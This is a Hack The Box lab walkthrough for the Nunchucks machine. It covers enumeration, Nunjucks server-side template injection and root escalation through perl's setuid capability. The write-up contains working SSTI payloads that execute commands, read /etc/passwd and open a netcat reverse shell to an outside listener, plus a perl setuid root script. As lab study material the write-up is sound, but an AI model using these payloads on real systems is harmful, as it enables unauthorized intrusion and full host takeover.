---
title: Nunchucks - A HackTheBox machine 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
---

# Nunchucks - A Hack The Box machine


## User's flag

###  Enumeration

```shell-session
nmap -sC -sV 10.129.95.252 -Pn
```

Open ports: 22, 80, and 443.

Also http://nunchucks.htb is in results.

Adding IP and domain nunchucks.htb to /etc/hosts.

```shell-session
whatweb http://nunchucks.htb 
```

And some directory enumeration:

```
feroxbuster -u https://nunchucks.htb -k
```

Results:

```
200      GET      250l     1863w    19134c https://nunchucks.htb/Privacy
200      GET      245l     1737w    17753c https://nunchucks.htb/Terms
200      GET      183l      662w     9172c https://nunchucks.htb/login
200      GET      187l      683w     9488c https://nunchucks.htb/signup
```

Trying to login into the application or signing up returns the following response message:

```
{"response":"We're sorry but user logins are currently disabled."}

{"response":"We're sorry but registration is currently closed."}
```

Now, we will try some subdomain enumeration

```shell-session
wfuzz -c --hc 404 -t 200 -u https://nunchucks.htb/ -w /usr/share/dirb/wordlists/common.txt -H "Host: FUZZ.nunchucks.htb" --hl 546
# -c: Color in output
# –hc 404: Hide 404 code responses
# -t 200: Concurrent Threads
# -u http://nunchucks.htb/: Target URL
# -w /usr/share/dirb/wordlists/common.txt: Wordlist 
# -H “Host: FUZZ.nunchucks.htb”: Header. Also with "FUZZ" we indicate the injection point for payloads
# –hl 546: Filter out responses with a specific number of lines. In this case, 546
```

Results: store

We will add store.nunchucks.htb to /etc/hosts file.


### Exploitation

Browsing https://store.nunchucks.htb is a simple landing page to collect emails. There is a form for this purpose. After fuzzing it with Burpsuite we find this interesting output:

![Example](img/nunchucks_1.png)

Some code can get executed in that field. This vulnerability is known as [Server-side Template Injection (SSTI)](webexploitation/server-side-template-injection-ssti.md)

Once we have an injection endpoint, it's important to identify the application server and template engine running on it, since payloads and exploitation pretty much depends on it.

From headers response we have: "X-Powered-By: Express". 

Having a look at template engines in Express at [https://expressjs.com/en/resources/template-engines.html](https://expressjs.com/en/resources/template-engines.html), there exists a **[Nunjucks](https://github.com/mozilla/nunjucks)**, which is close the domain name nunchucks. 

This blog post describe how we can exploit this vulnerability: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine


Basically, I'm using the following payloads:

```
{{range}}

{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}

{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}

{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 1234 >/tmp/f')\")()}}
```

The last one is a reverse shell. Before running it in BurpSuite Repeater, I've setup my listener with netcat on port 1234.


## Root's flag

### Privileges escalation

We'll abuse some [process capability vulnerability](process-capabilities-getcap.md) to escalate to root. First we list processes capabilities:

```
getcap -r 2>/dev/null
```

Result:

```
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

We will use perl binary to escalate. 

```
echo -ne '#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec "/bin/bash";' > pay.pl
chmod +x pay.pl
./pay.pl
```

And you are root.

